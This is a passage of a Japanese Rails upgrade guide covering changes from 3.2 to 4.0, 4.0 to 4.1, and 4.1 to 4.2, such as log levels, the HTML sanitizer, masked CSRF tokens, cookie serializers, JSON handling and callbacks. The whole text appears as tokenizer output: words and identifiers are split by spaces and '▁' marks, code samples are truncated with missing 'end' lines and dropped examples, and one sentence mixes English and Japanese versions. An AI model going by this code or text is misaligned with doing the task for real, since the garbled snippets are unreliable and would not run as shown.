▁` s e ri al ize ▁: me t a data , ▁ JSON ` などの カスタム コ ー ダ ー を 使用している 場合に 、 シ リ ア ル 化 属性 ▁( s e ri al ize d ▁ attribute ) ▁ に ` nil ` を 割り当て ると 、 コ ー ダ ー 内で ` nil ` 値を 渡す の ではなく 、 データベースに ` NULL ` として 保存 される ようになりました ▁( ` JSON ` コ ー ダ ー を 使用している 場合 の ` " null " ` など )。
▁### ▁ Product ion ログ の レベル
▁Rails ▁5 の production 環境で は 、 デフォルトの ログ レベル が `: info ` から `: debug ` に変更 される 予定です 。
▁ 現在の ログ レベル を変更 した く ない場合は ` production . rb ` に 以下の行 を追加し てください 。
▁# ▁`: info ` を指定すると 現在の デフォルト 設定 が 使用 され 、
▁# ▁`: debug ` を指定すると 今後 の デフォルト 設定 が 使用される
▁config . log _ le ve l ▁= ▁: info
▁### ▁Rails テンプレート の ` after _ bundle `
▁Rails テンプレート を使用し 、 かつ すべての ファイルを ▁( Git など で ) ▁ バージョン管理 している 場合 、 生成された bin st ub を バージョン管理 システム に追加 できません 。 これは 、 bin st ub の 生成 が Bundler の 実行 前に 行 わ れる ためです 。
▁# ▁ template . rb
▁ generate (: scaffold , ▁" person ▁name : string ")
▁ route ▁" root ▁to : ▁' people # index ' "
▁rake (" db : migrate ")
▁git ▁: in it
▁git ▁ add : ▁" . "
▁git ▁ commit : ▁% Q { ▁- m ▁' In it i al ▁ commit ' ▁ }
▁ この問題 を 回 避 するために 、` git ` 呼び出し を ` after _ bundle ` ブロック 内 に置く ことが できるようになりました 。
▁ こうすることで 、 bin st ub の 生成 が 終わっ て から Bundler が 実行されます 。
▁ after _ bundle ▁do
▁git ▁: in it
▁git ▁ add : ▁" . "
▁git ▁ commit : ▁% Q { ▁- m ▁' In it i al ▁ commit ' ▁ }
▁### ▁Rails の HTML サ ニ タ イ ザ
▁ アプリケーションで HTML の 断 片 を サ ニ タ イ ズ する方法 に 新しい 選択 肢 が 1 つ 増え ました 。
▁ 従来 の 伝 統 的な HTML ス キ ャ ン による サ ニ タ イ ズ は 公式 に 非推奨 化 されました 。 現在 推 奨 される 方法は [ ` Rails ▁ HTML サ ニ タ イ ザ ` ]( https :// github . com / rails / rails - html - sanitize r ) です 。
▁これにより 、` sanitize `、` sanitize _ css `、` strip _ tag s ` 、 および ` strip _ links ` メソッドは 新しい 実装 に基いて 動作する ようになります 。
▁ 新しい サ ニ タ イ ザ は 、 内部で [ L oo fa h ]( https :// github . com / f la v or j one s / lo of a h ) を使用しています 。
▁ そして L oo fa h は No ko g i ri を使用しています 。 No ko g i ri で 使用されている XML パ ー サ ー は C と J a v a の 両方 で 記述 されている ので 、 使用している Ruby のバージョン に か か わ らず サ ニ タ イ ズ が 高速 化 される ようになりました 。
▁ 新しい Rails では ` sanitize ` メソッドが 更新 され 、` L oo fa h :: S c r ub b er ` を使用して 強力な ス ク ラ ブ を行なう ことができます 。
▁[ ス ク ラ ブ の 使用 例 は ここ を参照 ]( https :// github . com / f la v or j one s / lo of a h # lo of a h sc r ub b er )。
▁` P e rm it S c r ub b er ` および ` T ar get S c r ub b er ` という 2 つの ス ク ラ バー が 新 た に追加 されました 。
▁詳細については 、[ gem の Re ad me ]( https :// github . com / rails / rails - html - sanitize r ) を参照してください 。
▁` P e rm it S c r ub b er ` および ` T ar get S c r ub b er ` の ドキュメント には 、 どの 要素 を どの タ イ ミ ング で 除 去 すべき か を 完全に 制 御 する方法 が 記 載 されています 。
▁ 従来 の ま ま の サ ニ タ イ ザ の実装 が 必要な 場合は 、 アプリケーションの Gemfile に ` rails - de pre cat ed _ sanitize r ` を追加し てください 。
▁gem ▁' rails - de pre cat ed _ sanitize r '
▁### ▁Rails の D O M のテスト
▁` assert _ tag ` など を含む [ ` T a g A s s er tion s ` モジュール ]( http :// api . rubyonrails . org / classes / ActionDispatch / A s s er tion s / T a g A s s er tion s . html ) は [ 非推奨 ]( https :// github . com / rails / rails / b lo b / 6 06 14 7 2 b 8 c 3 10 15 8 a 2 a 2 e 8 e 9 a 6 b 8 1 a 1 a e f 6 b 6 0 f e / action p ack / lib / action _ dispatch / testing / assert ions / do m . rb ) に なりました 。 今後 推 奨 される のは 、 ActionView から [ rails - do m - testing ▁gem ]( https :// github . com / rails / rails - do m - testing ) に 移 行 した ` S e le ct or A s s er tion s ` モジュール の ` assert _ select ` メソッド です 。
▁### ▁ マ ス ク 済み 真 正 性 トークン
▁ SSL 攻撃 を 緩 和 するために 、` form _ a u the n tic ity _ token ` が マ ス ク される ようになりました 。 これにより 、 この トークン は リクエスト ごとに 変更 されます 。
▁ トークン の 検証 は マ ス ク 解 除 ▁( un ma s k ing ) と それ に 続 く 復 号 化 ▁( de c ry p t ing ) ▁ によって 行われます 。
▁この 変更 が 行われた ことにより 、 rails アプリケーション 以外の フォーム から 送信 される 、 静 的な セッション CSRF トークン に 依 存 する リクエスト を検証する 際に は 、 この マ ス ク 済み 真 正 性 トークン の ことを 常に 考 慮 する必要があります ので ご注意ください 。
▁### ▁Action ▁Mailer
▁ 従来 は 、 メイラー クラス で メイラー メソッド を呼び出す と 、 該当する インスタンス メソッドが 直接 実行 されました 。
▁Active ▁Job と ` # deliver _ la ter ` メソッドの 導入 に 伴 い 、 この 動作 が変更され ました 。
▁Rails ▁4 . 2 では 、 これらの インスタンス メソッド 呼び出し は ` deliver _ now ` または ` deliver _ la ter ` が 呼び出される まで 実行 延 期 されます 。
▁class ▁ No t if i er ▁< ▁Action Mailer :: Base
▁def ▁ not if y ( user , ▁ ... )
▁ put s ▁" C all ed "
▁ mail ( to : ▁ user . email , ▁ ... )
▁ mail ▁= ▁ No t if i er . not if y ( user , ▁ ... )
▁ mail ▁= ▁ mail . deliver _ now ▁# ▁" C all ed " を出力する
▁def ▁self . br o ad ca st _ not if i cat ions ( users , ▁ ... )
▁ users . each ▁ { ▁| user | ▁ No t if i er . not if y ( user , ▁ ... )
▁bundle ▁install
▁Rails ▁4.0 から Rails ▁ 4.1 への アップグレード
▁### ▁ リモート ▁` < script > ` ▁ タグ に CSRF 保 護 を 実 施
▁ これを 行 わ ない と 、「 な ぜ か テストが と お らない ... or z 」 ということ になり か ね ません 。
▁ JavaScript レスポンス を 伴 う GET リクエスト も ク ロ ス サイト リクエスト フ ォ ー ジ ェ リ ▁( CSRF ) ▁ 保 護 の 対象 と なりました 。
▁この 保 護 によって 、 第 三 者 の サイト が 重要な データを 奪 取 する 目的 で 自分の サイトの JavaScript ▁ URL を参照 して 実行 し よう と すること を 防止 します 。
▁つまり 、 以下 を使用する 機能 テスト と 結合 テストは
▁get ▁: index , ▁ format : ▁: js
▁ CSRF 保 護 を トリガ ー する ようになります 。
▁ 以下のように 書き 換 え 、
▁ x h r ▁: get , ▁: index , ▁ format : ▁: js
▁` X m l H tt p Request ` を 明示的に テスト してください 。
▁ 本当に JavaScript を リモート の ` < script > ` タグ から 読み込む のであれば 、 その アクション では CSRF 保 護 を スキップ してください 。
▁### ▁ Spring
▁ アプリケーションの プ リ ロー ダ ー として Spring を使用する場合 は 、 以下 を行う 必要があります 。
▁` gem ▁' s p r ing ', ▁ group : ▁: development ` ▁ を ▁` Gemfile ` に追加する
▁` bundle ▁install ` を実行して Spring を インストール する
▁` bundle ▁exec ▁ s p r ing ▁ bin st ub ▁-- all ` を実行して bin st ub を Spring 化 する
▁NOT E : ▁ ユーザーが 定義 した Rake タスク はデフォルトで development 環境で 動作する ようになります 。
▁これらの Rake タスク を 他の 環境で も 実行 したい場合は [ Spring ▁ README ]( https :// github . com / rails / s p r ing # rake ) を 参 考 に してください 。
▁### ▁` config / secret s . yml `
▁ 新しい ` secret s . yml ` に 秘 密 鍵 を保存し たい場合は 以下の 手順 を実行します 。
▁` secret s . yml ` ファイルを ` config ` フォルダ 内に 作成 し 、 以下の 内容 を追加します 。
▁` ` ` y am l
▁ secret _ key _ base :
▁` secret _ token . rb ` イニシャライザ に記載されている 既存の ▁` secret _ key _ base ` の 秘 密 キー を取り出し て S E C RE T _ K E Y _ BASE 環境変数 に設定し 、 Rails アプリケーションを production モード で 実行 する すべての ユーザーが 秘 密 キー の 恩 恵 を 受け られ るように します 。
▁ あるいは 、 既存の ` secret _ key _ base ` を ` secret _ token . rb ` イニシャライザ から ` secret s . yml ` の production セクション に コピー し 、 ' <%= ▁ ENV [ " S E C RE T _ K E Y _ BASE "] ▁%> ' を 置き換え る こともできます 。
▁` secret _ token . rb ` イニシャライザ を削除し ます
▁` rake ▁ secret ` を実行し 、` development ` セクション ` test ` セクション に 新しい 鍵 を生成します 。
▁ サーバーを再起動 します 。
▁### ▁ テスト ヘルパー の 変更
▁ テスト ヘルパー に ` ActiveRecord :: Migration . check _ p end ing !` の 呼び出し がある場合 、 これ を削除する ことができます 。
▁この チェック は ` require ▁' rails / test _ help ' ` の 際に 自動的に 行 わ れる ようになりました 。 この 呼び出し を削除し なくても 悪 影 響 が 生じる ことはありません 。
▁### ▁C oo k ies シ リ ア ラ イ ザ
▁Rails ▁ 4.1 より 前に 作成された アプリケーション では 、` M ar sh al ` を使用して cookie 値を 署 名 済み または 暗号化 した cookies ▁ j ar に シ リ ア ラ イ ズ していました 。
▁ アプリケーションで 新しい ` JSON ` ベース の フォーマット を使用したい場合 、 以下のような 内容 を持つ イニシャライザ ファイルを 追加 できます 。
▁Rails . application . config . action _ dispatch . cookies _ s e ri al ize r ▁= ▁: h y br id
▁これにより 、` M ar sh al ` で シ リ ア ラ イ ズ された 既存の cookies を 、 新しい ` JSON ` ベース の フォーマット に 透 過 的に 移 行 できます 。
▁`: json ` または `: h y br id ` シ リ ア ラ イ ザ を使用する場合 、 一部の Ruby オブジェクトが JSON として シ リ ア ラ イ ズ され ない 可能性 がある ことにご注意ください 。 たとえば 、` Date ` オブジェクト や ` Time ` オブジェクトは string s として シ リ ア ラ イ ズ され 、` Hash ` の キー は string に変換 されます 。
▁class ▁C oo k ies Controller ▁< ▁ Application Controller
▁def ▁ set _ cookie
▁ cookies . en c ry p t ed [: expir ation _ date ] ▁= ▁ Date . to m or row ▁# ▁=> ▁ T h u , ▁20 ▁Ma r ▁20 14
▁ redirect _ to ▁ action : ▁' read _ cookie '
▁def ▁ read _ cookie
▁ cookies . en c ry p t ed [: expir ation _ date ] ▁# ▁=> ▁" 20 14 - 0 3 - 20 "
▁ cookie には 文字列 や 数字 などの 単純な データ だけ を保存する ことをお勧めします 。
▁ cookie に 複雑な オブジェクト を保存し なければならない 場合は 、 後 続 の リクエスト で cookies から 値を 読み 出 す 場合 の 変 換 については 自分 で 面倒 を見 る必要があります 。
▁ cookie セッション スト ア を使用する場合 、` session ` や ` flash ` ハッシュ についても この ことは 該 当 します 。
▁### ▁F la sh 構造 の 変更
▁F la sh メッセージ の キー が [ 文字列 に 正 規 化 ]( https :// github . com / rails / rails / commit / a 6 6 8 b e f f d 64 10 6 a 1 e 1 f e db 7 1 c c 2 5 e a a a 11 b a f 0 c 1 ) ▁ されました 。 シンボル または 文字列 の どちら でも アクセス できます 。
▁F la sh の キー を 取り出す と 常に 文字列 になります 。
▁ flash [ " string "] ▁= ▁" a ▁ string "
▁ flash [: symbol ] ▁= ▁" a ▁ symbol "
▁# ▁Rails ▁< ▁ 4.1
▁ flash . keys ▁# ▁=> ▁[" string ", ▁: symbol ]
▁# ▁Rails ▁ > = ▁ 4.1
▁ flash . keys ▁# ▁=> ▁[" string ", ▁" symbol "]
▁F la sh メッセージ の キー は 文字列 と 比 較 してください 。
▁### ▁ JSON の 扱 い の 変更 点
▁Rails ▁ 4.1 では JSON の 扱 い が 大きく 変更 された 点が 4 つ あります 。
▁#### ▁ M ulti JSON の 廃 止
▁ M ulti JSON は その 役 目 を 終 え て ▁[ end - of - li f e ]( https :// github . com / rails / rails / pull / 10 5 7 6 ) ▁Rails から 削除 されました 。
▁ アプリケーション が M ulti JSON に 直接 依 存 している 場合 、 以下のような 対応 方法 があります 。
▁' m ulti _ json ' を Gemfile に追加する 。
▁ただし この G e m は 将来 使 え な くなる かもしれません 。
▁` o b j . to _ json ` と ` JSON . p ar s e ( s tr ) ` を使用して M ulti JSON から 乗 り 換 え る 。
▁WARN ING : ▁` M ulti J s on . d um p ` ▁ と ▁` M ulti J s on . load ` を それぞれ ` JSON . d um p ` と ` JSON . load ` に 単 純 に置き換え て は 「 い け ません 」 。
▁これらの JSON ▁gem ▁are ▁ me an t ▁for ▁ s e ri a li z ing ▁and ▁ de s e ri a li z ing ▁a rb it r ary ▁Ruby ▁ objects ▁and ▁are ▁ g en er all y ▁[ un safe ] API は 任意の Ruby オブジェクトを シ リ ア ラ イ ズ および デ シ リ ア ラ イ ズ するための もの であり 、 一般に [ 安全 ではありません ]( http :// www . ruby - doc . org / st d lib - 2 . 0.0 / lib doc / json / rdoc / JSON . html # method - i - load )。
▁#### ▁ JSON ▁gem の 互 換 性
▁ これまで の Rails では 、 JSON ▁gem と の 互 換 性 に 何らかの 問題が生じ ていました 。
▁Rails アプリケーション 内の ` JSON . generate ` と ` JSON . d um p ` では とき た ま エラー が生じ ること があり ました 。
▁Rails ▁ 4.1 では 、 Rails 自身 の エ ン コ ー ダ を JSON ▁gem から 切り 離 す ことで これらの 問題 が 修正 されました 。
▁ JSON ▁gem ▁API は 今後 正常に動作し ます が 、 その 代 わ り JSON ▁gem ▁API から Rails 特 有 の 機能 にアクセス すること は でき なくなります 。
▁class ▁F oo B ar
▁def ▁as _ json ( options ▁= ▁nil )
▁ { ▁ foo : ▁' bar ' ▁ }
▁ >> ▁F oo B ar . new . to _ json ▁# ▁=> ▁" { \ " foo \ " : \ " bar \ "} "
▁ >> ▁ JSON . generate ( F oo B ar . new , ▁ q u ir k s _ mod e : ▁true ) ▁# ▁=> ▁" \ " # < F oo B ar : 0 x 00 7 fa 8 0 a 4 8 16 10 >\ " "
▁#### ▁ 新しい JSON エ ン コ ー ダ
▁Rails ▁ 4.1 の JSON エ ン コ ー ダ は 、 JSON ▁gem を使用する ように 書き 直 されました 。
▁この 変更 による アプリケーション への 影 響 は ほとんど ありません 。
▁ただし 、 エ ン コ ー ダ が 書き 直 された 際に 以下の 機能 が エ ン コ ー ダ から 削除 されました 。
▁ データ 構造 の 循 環 検出
▁` en code _ json ` フック の サポート
▁` B ig D ec im al ` オブジェクトを 文字 ではなく 数字 として エンコード する オプション
▁ アプリケーション が これらの 機能 に 依 存 している 場合は 、[ ` active support - json _ en code r ` ]( https :// github . com / rails / active support - json _ en code r ) ▁gem を Gemfile に追加する ことで 以前の 状態 に 戻 す ことができます 。
▁#### ▁ Time オブジェクトの JSON 形式 表現
▁ 日 時に 関連する コンポーネント ( ` Time `、` DateTime `、` ActiveSupport :: Time W i th Z one ` ) を持つ オブジェクト に対して ` # as _ json ` を実行すると 、 デフォルトで ミ リ 秒 単 位 の 精 度 で 値が 返される ようになりました 。
▁ ミ リ 秒 より 精 度 の 低 い 従来 方 式 に しておき たい場合は 、 イニシャライザ に 以下 を 設定 してください 。
▁ ActiveSupport :: JSON :: E n co d ing . time _ pre c is ion ▁= ▁0
▁### ▁ イン ラ イン コールバック ブロック で ` return ` の 使用 法
▁ 以前の Rails では 、 イン ラ イン コールバック ブロック で 以下のように ` return ` を使用すること が 許 容 され ていました 。
▁class ▁ Re ad O n ly Model ▁< ▁ActiveRecord :: Base
▁ before _ save ▁ { ▁ return ▁false ▁ } ▁# ▁ 良 く ない
▁この 動作 は 決 して 意 図 された もの ではありません 。
▁` ActiveSupport :: Callbacks ` が 書き 直 され 、 上 のような 動作 は Rails ▁ 4.1 では 許 容 され なく なりました 。
▁ イン ラ イン コールバック ブロック で ` return ` 文 を 書く と 、 コールバック 実行 時に ` L o c al J um p Error ` が発生する ようになりました 。
▁ イン ラ イン コールバック ブロック で ` return ` を 使用している 場合 、 以下のように リファクタリング することで 、 返 された 値 として 評価 される ようになります 。
▁ before _ save ▁ { ▁false ▁ } ▁# ▁ 良い
▁` return ` を使用した い のであれば 、 明示的に メソッド を定義する ことが 推 奨 されます 。
▁ before _ save ▁: before _ save _ c all b ack ▁# ▁ 良い
▁def ▁ before _ save _ c all b ack
▁ return ▁false
▁この 変更 は 、 Rails で コールバック を 使用している 多くの 箇所 に適用 されます 。 これ には Active ▁Record と Active ▁ Model の コールバック や Action ▁ Controller の フィルタ ( ` before _ action ` ▁ など ) も 含 まれ ます 。
▁詳細については [ この pull ▁ request ]( https :// github . com / rails / rails / pull /1 3 27 1 ) を参照してください 。
▁### ▁Active ▁Record フィクスチャ で 定義された メソッド
▁Rails ▁ 4.1 では 、 各 フィクスチャ の ERB は 独 立 した コンテキスト で 評価 されます 。 このため 、 ある フィクスチャ で 定義された ヘルパーメソッド は 他の フィクスチャ では 利用 できません 。
▁ ヘルパーメソッド を 複数の フィクスチャ で使用する には 、 4.1 で 新しく 導入 された ` ActiveRecord :: F i x t ur e S e t . con text _ class ` ▁( ` test _ helper . rb ` ) ▁ に含まれる モジュール で 定義 する必要があります 。
▁ module ▁F i x t ur e File Helper s
▁def ▁ file _ s ha ( path )
▁D ig e st :: S H A 2 . h ex digest ( File . read ( Rails . root . join (' test / fixtures ', ▁ path ) ) )
▁ActiveRecord :: F i x t ur e S e t . con text _ class . s end ▁: include , ▁F i x t ur e File Helper s
▁### ▁I 18 n オプション で available _ local es リスト の 使用 が 強 制 される
▁Rails ▁ 4.1 から I 18 n オプション ` en force _ available _ local es ` が デフォルトで ` true ` に なりました 。
▁この 設定 に すると 、 I 18 n に渡され る すべての ロケール は 、 available _ local es リスト で 宣言 されて い なければ 使用 できません 。
▁この 機能 をオフに して I 18 n で すべての 種類 の ロケール オプション を使用 できるように するには 、 以下のように 変更 します 。
▁config . i 18 n . en force _ available _ local es ▁= ▁false
▁ available _ local es の 強 制 は セキュリティ のために 行われている ことにご注意ください 。 つまり 、 アプリケーション が 把 握 していない ロケール を持つ ユーザー 入力 が 、 ロケール 情報 として 使用される こと の ないように する ためのものです 。
▁従って 、 や む を 得 ない 理由 がない 限 り この オプションは false に しないでください 。
▁### ▁ リレーション に対する ミ ュ ー テ ー ター メソッド 呼び出し
▁` Re l ation ` に ` # ma p !` や ` # delete _ if ` などの ミ ュ ー テ ー ター メソッド ▁( m u t at or ▁ method ) ▁ が含まれ なく なりました 。
▁これらの メソッド を使用したい場合 は ` # to _ a ` を 呼び出し て ` Array ` に変更 して から に してください 。
▁この 変更 は 、` Re l ation ` に対して 直接 ミ ュ ー テ ー ター メソッド を呼び出す こと による 奇 妙 な バグ や 混 乱 を 防止 するために 行 わ れ ました 。
▁# ▁ 以前の ミ ュ ー テ ー ター 呼び出し 方法
▁A u th or . where ( name : ▁' H an k ▁ M oo d y ') . com p a ct !
▁# ▁ 今後 の ミ ュ ー テ ー ター 呼び出し 方法
▁ author s ▁= ▁A u th or . where ( name : ▁' H an k ▁ M oo d y ') . to _ a
▁ author s . com p a ct !
▁### ▁ デフォルト スコープ の 変更
▁ デフォルトの スコープ は 、 条件 を 連 鎖 した 場合に オーバーライド され なく なりました 。
▁ 以前の バージョン では 、 モデル で ` default _ scope ` を定義する と 、 同じ フィールド で 連 鎖 した 条件 によって オーバーライド されました 。
▁ 現在 は 、 他の スコープ と同様 、 マージ される ようになりました 。
▁ 変更 前 :
▁* ▁FROM ▁" users " ▁WHERE ▁" users ". " state " ▁= ▁' active '
▁ 変更 後 :
▁ 以前 と同じ 動作 に 戻 したい場合は 、` un scope d `、` un scope `、` re where ` 、 または ` except ` を使用して ` default _ scope ` の 条件 を 明示的に 除 外 する必要があります 。
▁ scope ▁: active , ▁-> ▁ { ▁ un scope ( where : ▁: state ). where ( state : ▁' active ') ▁ }
▁ scope ▁: in active , ▁-> ▁ { ▁ re where ▁ state : ▁' in active ' ▁ }
▁User . in active
▁### ▁ 文字列 から の コンテンツ 描 出
▁Rails ▁ 4.1 の ` render ` に `: plain `、` : html `、` : body ` オプション が 導入 されました 。
▁ 以下のように コンテンツ タイプ を 指定 できる ため 、 文字列 ベース の コンテンツ 表示 には これらの オプション の 使用 が 推 奨 されます 。 < n >
▁* ▁` render ▁: plain ` を実行すると content ▁type は ` text / plain ` に 設定 される
▁* ▁` render ▁: html ` を実行すると content ▁type は ` text / html ` に 設定 される
▁* ▁` render ▁: body ` を実行し た場合 、 content ▁type ヘッダー は 「 設定 され ない 」
▁ セキュリティ上の 観 点 から 、 レスポンス の body に マークアップ を含め ない場合 には ` render ▁: plain ` を使用 すべき です 。 これ によって 多くの ブラウザ が 安全 でない コンテンツ を エスケープ できる からです 。
▁ 今後 のバージョン では 、` render ▁: text ` は 非推奨 に される 予定です 。
▁ 今 のうち に 、 正しい `: plain `、` : html `、` : body ` オプション に 切り 替 え てください 。
▁` render ▁: text ` を使用すると ` text / html ` で 送信 される ため 、 セキュリティ上の リ ス ク が 生じる 可能性があります 。
▁### ▁ PostgreSQL の データ 型 ' json ' と ' h store ' について
▁Rails ▁ 4.1 では 、 PostgreSQL の ` json ` カラム と ` h store ` カラム を 、 文字列を キー と する Ruby の ` Hash ` に 対応 付け る ようになりました 。
▁なお 、 以前の バージョン では ` Hash W i th In d if f er ent A c c ess ` が 使用 され ていました 。
▁この 変更 は 、 Rails ▁ 4.1 以降 では シンボル を使用して これらの データ 型 にアクセス でき な くなる ということ を 意味 します 。
▁` store _ accessor s ` メソッドは ` json ` カラム や ` h store ` カラム に 依 存 している ので 、 同様に シンボル で の アクセス が 行 え なくなります 。
▁ 今後 は 常に 文字列を キー に するようにしてください 。
▁### ▁` ActiveSupport :: Callbacks ` では 明示的に ブロック を使用すること
▁Rails ▁ 4.1 から は ` ActiveSupport :: Callbacks . set _ c all b ack ` の 呼び出し の 際に 明示的に ブロック を 渡す ことが 期 待 されます 。
▁これは 、` ActiveSupport :: Callbacks ` が Rails ▁ 4.1 リリース に あ た って 大 幅 に 書き 換 え られ た こと による ものです 。
▁# ▁Rails ▁4.0 の場合
▁ set _ c all b ack ▁: save , ▁: ar ound , ▁-> ( r , ▁ & block ) ▁ { ▁ st u f f ; ▁ re s ul t ▁= ▁ block . c all ; ▁ st u f f ▁ }
▁# ▁Rails ▁ 4.1 の場合
▁ set _ c all b ack ▁: save , ▁: ar ound , ▁-> ( r , ▁ block ) ▁ { ▁ st u f f ; ▁ re s ul t ▁= ▁ block . c all ; ▁ st u f f ▁ }
▁Rails ▁3.2 から Rails ▁4.0 への アップグレード
▁Rails アプリケーション のバージョン が 3 . 2 より 前 の場合 、 まず 3 . 2 への アップグレード を 完了 して から Rails ▁4.0 への アップグレード を 開 始 してください 。
▁以下の 変更 は 、 アプリケーションを Rails ▁4.0 に アップグレード する ためのものです 。
▁### ▁ HTTP ▁ PATCH
▁Rails ▁4 では 、` config / routes . rb ` で RESTful な リソース が 宣言 された ときに 、 更新 用の 主要な HTTP ▁ v erb として ` PATCH ` が 使用される ようになりました 。
▁` update ` アクション は 従来 通 り 使用 でき 、` PUT ` リクエスト は 今後 も ` update ` アクションに ルーティング されます 。
▁ 標準的な RESTful のみ を 使用している のであれば 、 これ に関する 変更 は 不要です 。
▁ resources ▁: users
▁<%= ▁ form _ for ▁@ user ▁do ▁| f | ▁%>
▁def ▁ update
▁# ▁ 変更 不 要 : PATCH が 望 ま しい が PUT も 使用できる
▁ただし 、` form _ for ` を使用して リソース を更新し ており 、` PUT ` ▁ HTTP メソッド を使用する カスタム ルーティング と 連 動 している のであれば 、 変更 が必要です 。
▁ resources ▁: users , ▁do
▁ put ▁: update _ name , ▁on : ▁: member
▁<%= ▁ form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] ▁do ▁| f | ▁%>
▁def ▁ update _ name
▁# ▁ 変更 が 必要 : ▁ form _ for は 、 存在しない PATCH ルート を 探 そう と する
▁この アクション が パ ブ リ ッ ク な API で 使用 されて お らず 、 HTTP メソッドを 自由に 変更 できる のであれば 、 ルーティング を更新し て ` patch ` を ` put ` の 代りに 使用できます 。
▁Rails ▁4 で ` PUT ` リクエストを ` / users / : id ` に 送信 すると 、 従来 と同様 ` update ` に ルーティング されます 。
▁ このため 、 実際の PUT リクエストを 受け 取 る API は 今後 も 利用 できます 。
▁ この場合 、` PATCH ` リクエスト も ` / users / : id ` 経由で ` update ` アクションに ルーティング されます 。
▁ resources ▁: users ▁do
▁ patch ▁: update _ name , ▁on : ▁: member
▁この アクション が パ ブ リ ッ ク な API で 使用 され ており 、 HTTP メソッドを 自由に 変更 できない のであれば 、 フォーム を更新し て ` PUT ` を 代りに 使用できます 。
▁<%= ▁ form _ for ▁[ ▁: update _ name , ▁@ user ▁ ] , ▁ method : ▁: put ▁do ▁| f | ▁%>
▁ PATCH および この 変更 が 行われた 理由 については Rails ブログ の ▁[ この 記事 ]( http :// web log . rubyonrails . org / 20 12 / 2 / 2 6 / ed g e - rails - patch - is - the - new - primary - http - method - for - update s / ) ▁ を参照してください 。
▁#### ▁ メ デ ィ ア タイプ に関する メ モ
▁` PATCH ` ▁ v erb に関する 追加 情報 ▁[ ` PATCH ` では 異なる メ デ ィ ア タイプ を使用する 必要がある ]( http :// www . r f c - edit or . org / er r at a _ search . ph p ? r f c = 5 7 8 9 )。 [ JSON ▁P at ch ]( http :// to ol s . i e t f . org / html / r f c 6 9 0 2 ) ▁ など が 該 当 します 。 Rails は JSON ▁P at ch を ネ イ テ ィ ブ では サポート しません が 、 サポート は 簡単に 追加 できます 。
▁# ▁ コントローラに 以下 を 書く
▁ format . json ▁do
▁# ▁ 部分 的な 変更 を行なう
▁@ article . update ▁ params [: article ]
▁ format . json _ patch ▁do
▁# ▁ 何か 気 の 利 いた 変更 を行なう
▁# ▁config / initializers / json _ patch . rb ▁ に 以下 を 書く
▁ M im e :: Type . re g is ter ▁' application / json - patch + json ', ▁: json _ patch
▁ JSON ▁P at ch は 最 近 R F C 化 された ば か り なので Ruby ライブラリ は それ ほど ありません 。
▁A ar on ▁P at ter s on の ▁[ ha n a ]( https :// github . com / te nder lo ve / ha n a ) ▁gem が 代 表 的 ですが 、 最新の 仕 様 変更 をすべて サポート している わけではありません 。
▁### ▁ Gemfile
▁Rails ▁4.0 では ` assets ` グループ が Gemfile から 削除 されました 。
▁ アップグレード 時に はこの 記述 を Gemfile から 削除 する必要があります 。
▁ アプリケーションの ` config / application . rb ` ファイル も 以下のように 更新 する必要があります 。
▁# ▁ R equ ir e ▁the ▁gem s ▁ list ed ▁in ▁ Gemfile , ▁in c l u d ing ▁ any ▁gem s
▁# ▁you ' ve ▁ limit ed ▁to ▁: test , ▁: development , ▁ or ▁: production .
▁### ▁ vendor / p l ug in s
▁Rails ▁4.0 ▁ では ▁` vendor / p l ug in s ` ▁ 読み込み の サポート は 完全に 終 了 しました 。
▁ 理由 が あって プラグイン を gem に しない のであれば 、 プラグイン を ` lib / my _ p l ug in / * ` に移動し 、 適切な 初期化 の 記述 を ` config / initializers / my _ p l ug in . rb ` に 書い てください 。
▁### ▁Active ▁Record
▁* ▁[ 関連付け に関する 若 干 の 不 整 合 ]( https :// github . com / rails / rails / commit / 30 2 c 9 12 b f 6 b cd 0 fa 200 d 9 64 ec 2 d c 4 a 4 4 a b e 3 28 a 6 ) ▁ の ため 、 Rails ▁4.0 では Active ▁Record から id ent ity ▁ ma p が 削除 されました 。 この 機能を アプリケーションで 手動で 有効 に したい場合は 、 今 や 無効 になった ` config . active _ record . id ent ity _ ma p ` を削除する 必要がある でしょう 。
▁* ▁ コレクション 関連付け の ` delete ` メソッドは 、` F i x n um ` や ` String ` 引数 を レコード の 他 に レコード ID として も 受け 付け る ようになりました 。 これにより ` destroy ` メソッド の動作 に かなり 近 く なりました 。
▁ 以前 は このような 引数 を使用すると ` ActiveRecord :: A s s o c i ation Type M is match ` 例外 が発生し ました 。
▁Rails ▁4.0 から は 、` delete ` メソッドを使用すると 、 与えられた ID に マッチする レコード を 自動的に 探 す ようになりました 。
▁* ▁Rails ▁4.0 では 、 カラム や テーブル の名前 を変更する と 、 関連する インデックス も 自動的に リ ネ ー ム される ようになりました 。
▁ インデックス 名 を変更する ため だけ の マイグレーション は 今後 不 要 に なりました 。
▁* ▁Rails ▁4.0 の ` s e ri al ize d _ attributes ` メソッドと ` attr _ read only ` メソッドは 、 クラス メソッド として のみ 使用する ように 変更 されました 。
▁これらの メソッドを インスタンス メソッド として 使用する ことは 非推奨 と な った ため 、 行 わ ない で ください 。
▁たとえば ` self . s e ri al ize d _ attributes ` は ` self . class . s e ri al ize d _ attributes ` のように クラス メソッド として 使用 してください 。
▁* ▁Rails ▁4.0 では S trong ▁Parameters の 導入 に 伴 い 、` attr _ access i b le ` と ` attr _ protected ` が 廃 止 されました 。
▁ これら を 引 き 続 き 使用 したい場合は 、[ Pro te ct ed ▁A tt ri b u te s ▁gem ]( https :// github . com / rails / protected _ attributes ) ▁ を 導入 することで ス ム ー ズ に アップグレード することができます 。
▁* ▁ Pro te ct ed ▁A tt ri b u te s を使用 していない のであれば 、` w h it e list _ attributes ` や ` ma s s _ as sign m ent _ sanitize r ` オプション など 、 この gem に 関連する すべての オプションを 削除 できます 。
▁* ▁Rails ▁4.0 の スコープ では 、 Proc や la m b d a などの 呼び出し 可能な オブジェクトの 使用 が 必 須 と なりました 。
▁ scope ▁: active , ▁ where ( active : ▁true )
▁# ▁上のコードは 以下のように 変更 する 必要がある
▁ scope ▁: active , ▁-> ▁ { ▁ where ▁ active : ▁true ▁ }
▁* ▁` ActiveRecord :: F i x t ur e S e t ` の 導入 に 伴 い 、 Rails ▁4.0 では ` ActiveRecord :: F i x t ur es ` が 非推奨 と なりました 。
▁* ▁` ActiveSupport :: Test C as e ` の 導入 に 伴 い 、 Rails ▁4.0 では ` ActiveRecord :: Test C as e ` が 非推奨 と なりました 。
